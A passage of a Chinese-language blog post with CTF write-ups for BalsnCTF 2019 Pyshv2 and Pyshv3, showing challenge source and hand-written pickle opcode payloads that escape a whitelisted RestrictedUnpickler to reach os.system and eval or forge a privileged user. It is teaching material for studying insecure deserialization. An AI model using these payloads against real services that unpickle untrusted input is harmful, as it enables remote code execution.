&#x27;__setattr__&#x27;, &#x27;__setitem__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;clear&#x27;, &#x27;copy&#x27;, &#x27;fromkeys&#x27;, &#x27;get&#x27;, &#x27;items&#x27;, &#x27;keys&#x27;, &#x27;pop&#x27;, &#x27;popitem&#x27;, &#x27;setdefault&#x27;, &#x27;update&#x27;, &#x27;values&#x27;]</span><br></pre></td></tr></table></figure>

<p>然后sys就被替换成sys.modules了,就可以拿到os了</p>
<p>然后再对sys.modules[‘sys’]再赋值为os</p>
<p>就可以import os了</p>
<p>(师傅们tql)</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">S&#x27;sys&#x27;</span><br><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">scsys</span><br><span class="line">get</span><br><span class="line">(S&#x27;os&#x27;</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">S&#x27;sys&#x27;</span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line">system</span><br><span class="line">(S&#x27;dir&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>





<h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;structs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">&#x27;help&#x27;</span>: self.cmd_help,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Available commands: &#x27;</span> + <span class="string">&#x27; &#x27;</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>



<p>这次更骚了直接给了个空模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; dir(structs)</span></span><br><span class="line">[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;]</span><br></pre></td></tr></table></figure>



<p><code>__spec__,__loader__,__builtins__</code>是我们需要注意的</p>
<p>我们看一下操作码c(看重载后的find_class代码,看别人wp的时候没看重载后的find_class,然后连wp都看不懂了)的实现,发现调用了<code>__import__</code></p>
<p>在文档中发现</p>
<blockquote>
<p>此函数(<code>__import__</code>)会由 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义 </p>
</blockquote>
<p>而<code>__buiutins__</code>里面也有<code>__import__</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; structs.__builtins__[&#x27;__import__&#x27;]=eval</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: eval expected at most 3 arguments, got 5</span><br><span class="line">&gt;&gt;&gt; __import__(&#x27;print(123)&#x27;)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>



<p>成功修改了<code>__import__</code></p>
<p>我们再看重载的find_class</p>
<p>securePickle.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        module = <span class="built_in">__import__</span>(module)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(module, name)</span><br><span class="line"><span class="comment">#一般重载都会改成if xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而原来的find_class是这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span>:</span></span><br><span class="line">    <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure>



<p>接着我们可以通过操作码c来实现一下操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">getattr</span>(<span class="built_in">__import__</span>(module), name)</span><br></pre></td></tr></table></figure>

<p>如果能令<code>__import__(module)</code>的返回值为<code>__builtins__</code>时,就可以取出<code>__builtins__</code>里的值</p>
<p>结合<a target="_blank" rel="noopener" href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1">魔术方法</a><code>__getattribute__</code>便可以实现</p>
<p>于是构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bis=structs.__builtins__</span><br><span class="line">structs.__setattr__(<span class="string">&#x27;structs&#x27;</span>,bis)<span class="comment">#name只能为structs</span></span><br><span class="line">bis[<span class="string">&#x27;__import__&#x27;</span>]=structs.__getattribute__</span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;structs&quot;</span>),<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;eval&quot;</span>)(<span class="string">&quot;print(123)&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>对应的pickle代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__builtins__</span><br><span class="line">p100</span><br><span class="line">0cstructs</span><br><span class="line">__setattr__</span><br><span class="line">(S&#x27;structs&#x27;</span><br><span class="line">g100</span><br><span class="line">tRg100</span><br><span class="line">S&#x27;__import__&#x27;</span><br><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S&quot;eval&quot;</span><br><span class="line">tR(S&#x27;print(123)&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>







<h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><p>structs.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, group</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br></pre></td></tr></table></figure>



<p>server.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;structs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.key = os.urandom(<span class="number">100</span>)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">&#x27;help&#x27;</span>: self.cmd_help,</span><br><span class="line">            <span class="string">&#x27;whoami&#x27;</span>: self.cmd_whoami,</span><br><span class="line">            <span class="string">&#x27;su&#x27;</span>: self.cmd_su,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(self.key, flag))</span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Login as &#x27;</span> + user.name + <span class="string">&#x27; - &#x27;</span> + user.group)</span><br><span class="line">        user.privileged = <span class="literal">False</span></span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Available commands: &#x27;</span> + <span class="string">&#x27; &#x27;</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_whoami</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag: Permission denied&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>



<p>如果我们想拿到flag,要么命令执行直接拿flag要么就令<code>user.privileged=True</code> 调用cmd_flag来拿flag</p>
<p>但是再反序列化处</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;Login as &#x27;</span> + user.name + <span class="string">&#x27; - &#x27;</span> + user.group)</span><br><span class="line">      user.privileged = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><code>user.privileged</code>会被覆盖为False,再康康其他的信息把</p>
<p><code>dir(structs)</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;User&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>]</span><br></pre></td></tr></table></figure>

<hr>
<p>几个小时后,看wp学成归来.</p>
<p>我:艹,太骚了,师傅们牛逼死了</p>
<hr>
<p>之前说有两个解题思路,命令执行这一个思路在看了一会之后就觉得不太行,毫无头绪</p>
<p>再康康让<code>user.privileged=False</code>失效这一思路,emmmm感觉也不太行.</p>
<p>但是,类的赋值肯定会受到一些特殊函数的影响</p>
<p>在研究类的赋值的时候可以找到<a target="_blank" rel="noopener" href="https://foofish.net/what-is-descriptor-in-python.html">描述符</a>可以自定义赋值函数</p>
<p>那么如果我们能让User的<code>__set__</code>变成一个接受3个参数的函数,就可以令<code>user.privileged=False</code>无效</p>
<p>但是很显然pickle里是无法直接编写代码的,令<code>__set__=&quot;&quot;</code>?更不行,会直接报错</p>
<p>继续阅读代码我们会发现一个神奇的东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, group</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;name:%s ,group:%s&quot;</span>%(name,group))</span><br></pre></td></tr></table></figure>

<p><code>User.__init__</code>刚好接受三个参数</p>
<p>我们能不能让<code>__set__=User</code>?,然后调用<code>__set__</code>的时候调用<code>User.__init__</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(User,<span class="string">&#x27;test&#x27;</span>,User(<span class="number">123</span>,<span class="number">123</span>))</span><br><span class="line">name:<span class="number">123</span> ,group:<span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(User,<span class="string">&quot;__set__&quot;</span>,User)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b=User(<span class="number">123</span>,<span class="number">123</span>)</span><br><span class="line">name:<span class="number">123</span> ,group:<span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.test=<span class="number">123123</span></span><br><span class="line">name:&lt;structs.User <span class="built_in">object</span> at <span class="number">0x0000017BA1538748</span>&gt; ,group:<span class="number">123123</span></span><br></pre></td></tr></table></figure>



<p>于是构造:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">__import__</span>(<span class="string">&quot;structs&quot;</span>).User</span><br><span class="line">b=User(<span class="string">&quot;123&quot;</span>,<span class="string">&quot;456&quot;</span>)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&quot;privileged&quot;</span>,b)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&quot;__set__&quot;</span>,a)</span><br><span class="line"><span class="keyword">return</span> b</span><br></pre></td></tr></table></figure>

<p>对应的pickle代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(S&quot;123&quot;</span><br><span class="line">S&quot;456&quot;</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(N&#125;S&#x27;privileged&#x27;</span><br><span class="line">g101</span><br><span class="line">sS&#x27;__set__&#x27;</span><br><span class="line">g100</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ help</span><br><span class="line">Available commands: help whoami su flag</span><br><span class="line">$ whoami</span><br><span class="line">123 456</span><br><span class="line">$ flag</span><br><span class="line">b&#x27;Balsn&#123;pY7h0n1dae_ObJ3c7&#125;\n&#x27;</span><br></pre></td></tr></table></figure>

<p>hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a> </p>
<p> <a target="_blank" rel="noopener" href="http://www.polaris-lab.com/index.php/archives/178/">http://www.polaris-lab.com/index.php/archives/178/</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> </p>
<p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5306">https://xz.aliyun.com/t/5306</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/pickle/" data-id="cku89gxvb005swvos0lz97l65" data-title="python  pickle 入门" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020 ciscn 华东南 web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.627Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
